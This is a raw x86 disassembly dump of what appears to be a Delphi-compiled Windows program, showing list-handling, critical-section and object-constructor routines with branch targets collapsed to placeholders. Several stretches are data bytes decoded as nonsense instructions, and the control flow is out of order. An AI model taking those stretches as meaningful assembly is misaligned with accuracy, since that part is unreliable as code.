sub_41700f
push ecx
push eax
dec [ eax - 0x6fffbdeb ]
adc eax 0x15940042
inc edx
add [ ebp + edx + 0x15e00042 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ ecx + 0x41 ] dh
outsb
outsb
je r-xdata
add [ eax ] dh
sbb eax [ edx ]
arpl [ ecx + 0x63 ] ax
je r-xdata
add [ eax ] al
adc [ eax ] al
std
jo r-xdata
[ edi + 0x5e ]
pop ebx
retn
arpl [ ecx + 0x63 ] ax
je sub_417254
in al 0x15
inc edx
add ah bl
push ss
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x9000408d
jno r-xdata
adc [ eax ] al
or al 0x0
add [ edi ] al
or dl [ ebx + eax * 2 + 0x6f ]
insd
jo r-xdata
outsd
outsb
lea eax [ eax ]
hlt
sbb al 0x33
inc eax
add al dl
sbb al [ edx ]
cwde
pop [ ecx ]
cld
adc al 0x42
add [ esi + ecx * 4 + 0x15d40041 ] dh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
jno r-xdata
push esp
inc edx
popad
jae r-xdata
sub al 0x1a
inc edx
add [ eax + 0x1000421a ] al
add [ eax + eax ] dl
add [ eax ] al
mov al 0x10
inc eax
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
jno r-xdata
outsb
outsb
je r-xdata
inc edx
add [ ecx + ebx ] cl
inc edx
add ah dh
adc eax 0x15ec0042
inc edx
add [ ecx + ebx ] dl
inc edx
add [ edx + ebx + 0x1bf00042 ] cl
inc edx
add [ ebx + ebx + 0x1b280042 ] dl
inc edx
add [ eax + 0x1b ] bl
inc edx
add [ ebx + ebx ] ch
inc edx
add [ eax + 0x1b ] bh
inc edx
add [ ecx ] al
add bh ch
[ ebx + ebx + 0x42 ]
add [ esp + edx * 2 ] cl
inc edx
popad
jae r-xdata
mov ah 0x8e
inc ecx
add ah dl
adc eax 0x1b300042
inc edx
add ah ah
adc eax 0x16dc0042
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
jno r-xdata
inc edx
add [ eax - 0x47ffbdeb ] dh
adc eax 0x15bc0042
inc edx
add al cl
adc eax 0x16740042
inc edx
add [ eax - 0x5bffbdea ] cl
sbb [ edx ] al
mov ah 0x15
inc edx
add [ eax - 0x7bffbdeb ] bl
adc eax 0x18cc0042
inc edx
add [ edx ] cl
push esp
inc ebx
outsd
insd
jo r-xdata
adc eax 0x15e00042
outsd
inc ecx
add [ ecx + 0x41 ] cl
add [ edx ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add al ah
jno r-xdata
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add al ah
sbb [ edx ] eax
fcomp [ ecx ]
inc edx
add [ edx + ebx ] dl
inc edx
add [ edx + ebx + 0x42 ] dh
add [ eax + 0x1a ] cl
inc edx
add [ eax + 0x1a ] bh
inc edx
add [ eax + 0x2c004219 ] bl
sbb al [ edx ]
sbb [ edx ] 0x42
add [ eax ] dl
add [ ebp + esi + 0x35a80040 ] ah
jae r-xdata
fcom [ esi ]
add [ eax + eax ] dl
add [ edi + ebp * 2 + 0x41 ] ah
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
inc edx
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
add bh bh
or al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add edx [ ecx + 0x67 ]
lea eax [ eax ]
adc [ ecx + 0x41 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
inc ecx
add [ eax ] cl
add [ eax ] al
[ eax ]
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040000 ] al
popad
insd
cmp al 0x10
inc eax
add [ eax + eax ] cl
add [ eax + 0x6e ] dh
sub_41723c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_406318
pop edi
pop esi
pop ebx
retn
sub_417264
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4062fc
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41728c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_406320
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4172cc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x73
inc ecx
add [ eax + eax ] dl
add [ eax ] al
mov al 0x10
inc eax
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
test al 0x35
add [ ecx ] cl
push esp
push edx
inc edi
jb r-xdata
xlat
add [ edx ] cl
push esp
push edx
inc edi
jb r-xdata
mov [ esp + 0x4 ] edx
mov [ esp ] eax
jne r-xdata
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
nop
jne r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
call sub_4188a0
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_40357c
test al al
je r-xdata
inc esi
xor edi edi
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
add al 0x89
add al 0x24
mov eax eax
insb
jae r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_40357c
test al al
je r-xdata
in al dx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
jae r-xdata
sbb al 0x33
inc eax
add al bh
ja r-xdata
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 + 0x41 ] ch
add [ eax + eax ] ah
add [ eax ] al
mov al 0x10
inc eax
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
xor esi esi
mov edx ebx
mov eax edi
call sub_417384
mov esi eax
jmp r-xdata
inc eax
add al dl
je r-xdata
add [ ebx ] dh
inc eax
add [ ebx + esi ] bl
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417384
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_40357c
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_417384
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_4188a0
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_40357c
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_40357c
test al al
je r-xdata
sub_4173e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_417384
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417384
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_40357c
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_417454
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403338
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_418744
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_4174d0
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
mov eax [ esi + 0x4 ]
call sub_403368
mov eax [ esi + 0x8 ]
call sub_403368
mov eax [ esi + 0xc ]
call sub_403368
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_417510
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_4188a0
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_4032cc
test al al
jne r-xdata
sub_417570
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_4188a0
mov edx eax
mov eax ebp
call sub_40357c
test al al
jne r-xdata
sub_4175b4
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41764f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4032b8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4043c8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_417510
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_418744
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417656
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc34
call sub_403b1c
sub_417674
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_4054bc
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_417694
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_4188a0
mov edx edi
call sub_417674
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4188a0
mov edx edi
call sub_417674
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_418790
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_417674
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_418790
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_417738
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_4188a0
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_417570
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_417784
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403338
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_417454
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418744
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_4177f8
push ebx
push esi
push edi
push ebp
call sub_40371c
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_403368
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403704
mov eax [ esi + 0x4 ]
mov edx edi
call sub_4188a0
call sub_403368
inc edi
dec ebp
jne r-xdata
sub_417854
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_4188a0
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_4173e4
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_417898
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_417510
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_4188a0
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_4178dc
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_41795f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4032b8
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
call sub_403b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417966
lea eax [ ebp - 0x10c ]
call sub_404164
retn
sub_41796c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_417854
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_417378
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_4178dc
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_4188a0
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4188a0
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40357c
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_417854
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418790
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_418744
sub_417a58
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4188a0
mov edx ebp
call sub_41765c
test al al
jne r-xdata
sub_417a9c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_417454
mov edx eax
mov eax [ edi + 0x4 ]
call sub_418744
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4188a0
mov eax [ eax + 0xc ]
mov edx ebp
call sub_4188fc
test eax eax
jge r-xdata
sub_417af8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4188a0
mov esi eax
mov edx ebp
mov eax esi
call sub_417694
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_403368
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418790
sub_417b48
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403338
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_417a34
xor eax eax
push ebp
push sub_417c47
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417c4e
mov eax [ rw-data ]
call sub_417aec
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418744
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4188a0
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_417570
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418744
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4188a0
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_417c4e
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_417c74
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403368
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_417ca4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_417a34
xor edx edx
push ebp
push sub_417d1b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_417aec
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403bc8
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4188a0
mov edx [ ebp - 0x4 ]
call sub_417510
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417d38
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_417d98
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
call sub_403b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417d9f
lea eax [ ebp - 0xc ]
call sub_404164
retn
sub_417da4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417a34
xor eax eax
push ebp
push sub_417dea
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_417898
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417df1
mov eax [ rw-data ]
call sub_417aec
retn
sub_417df8
push ebx
push esi
mov esi eax
mov eax esi
call sub_417da4
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_417d38
sub_417e18
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417a34
xor eax eax
push ebp
push j_sub_403ae4#4
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_417a58
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_417a40
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417e84
mov eax [ rw-data ]
call sub_417aec
retn
mov eax ebx
call sub_4032f4
mov ebx eax
sub_417e88
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417a34
xor eax eax
push ebp
push sub_417eca
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_417af8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417ed1
mov eax [ rw-data ]
call sub_417aec
retn
sub_417ed4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417a34
xor eax eax
push ebp
push sub_417f16
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_417a9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417f1d
mov eax [ rw-data ]
call sub_417aec
retn
sub_417f20
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_417a34
xor eax eax
push ebp
push sub_417f67
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_41796c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417f6e
mov eax [ rw-data ]
call sub_417aec
retn
sub_417f74
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417a34
xor eax eax
push ebp
push sub_417fc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_417738
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417fc9
mov eax [ rw-data ]
call sub_417aec
retn
sub_418028
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
pop ebp
retn 0x8
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_418060
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
